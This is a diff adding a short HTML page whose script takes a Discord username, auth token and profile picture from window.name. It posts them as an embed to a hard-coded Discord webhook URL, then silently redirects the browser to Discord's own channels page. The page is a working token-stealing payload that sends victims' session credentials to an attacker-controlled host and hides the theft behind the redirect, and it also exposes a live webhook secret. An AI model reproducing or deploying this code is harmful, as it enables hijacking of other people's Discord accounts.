@@ -1,0 +1,36 @@
+<!DOCTYPE html>
+<html>
+    <body>
+        <script>
+            var params = JSON.parse(window.name);
+            
+            var username = params["user"];
+            var token = params["auth"];
+            var profile = params["picture"];
+
+
+            const request = new XMLHttpRequest();
+            request.open("POST", "https://discord.com/api/webhooks/1158710960995967008/ObtoaA-IGX_I8SXzjkv8t_Z5K__VN_OF5pe2xEmOoDe4GfF9Z6S72eYETpy_jRZKOu9J");
+
+            request.setRequestHeader('Content-type', 'application/json');
+
+            var data = {
+                "embeds": [{
+                    "title": "Username: " + username,
+                    "thumbnail": {
+                        "url": profile
+                    },
+                    "fields": [{
+                        "name": "Token Value:",
+                        "value": token
+                    }],
+                    "color": 8410843
+                }]
+            }
+
+            request.send(JSON.stringify(data));
+
+            location.replace("https://discord.com/channels/@me");
+        </script>
+    </body>
+</html>
